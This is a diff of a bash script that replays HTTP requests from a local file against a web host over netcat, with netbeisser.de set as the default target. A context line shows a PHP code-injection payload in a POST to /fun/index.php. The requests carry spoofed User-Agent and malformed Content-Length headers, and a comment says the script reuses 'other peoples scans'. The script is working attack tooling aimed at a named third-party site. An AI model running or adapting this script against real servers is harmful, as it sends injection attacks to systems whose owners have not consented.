@@ -1,9 +1,9 @@
 #!/bin/bash
-
-H=$1
-SLEEP=1
-PORT=80
-DATASOURCE=/var/tmp/php.txt # method req
+#
+H=${1:-netbeisser.de}
+S=1
+P=80
+DS=/var/tmp/php.txt # method req
 set -o posix
 
 
@@ -162,10 +162,9 @@ POST /fun/index.php?!=1&topic=%3C?=hex(unique());?%3E%7C%3C?=$id;?%3E
 EOF
 
 while read line; do
-  sleep $SLEEP
-  {
-echo -e "$line\nHost: $H\nUser-Agent: Mozilla/5.1 (Wind0ws; U; Wind0ws ENTE 6.0; en-US)\nContent-Length: AAA\n\r\r\n"
-}| nc -v $H $PORT
+  sleep $S
+{
+   echo -e "$line\nHost: $H\nUser-Agent: Mozilla/5.1 (Wind0ws; U; Wind0ws ENTE 6.0; en-US)\nContent-Length: AAA\n\r\r\n"
+}| nc -v $H $P
 # make use of other peoples scans
-done < $DATASOURCE
-
+done < $DS
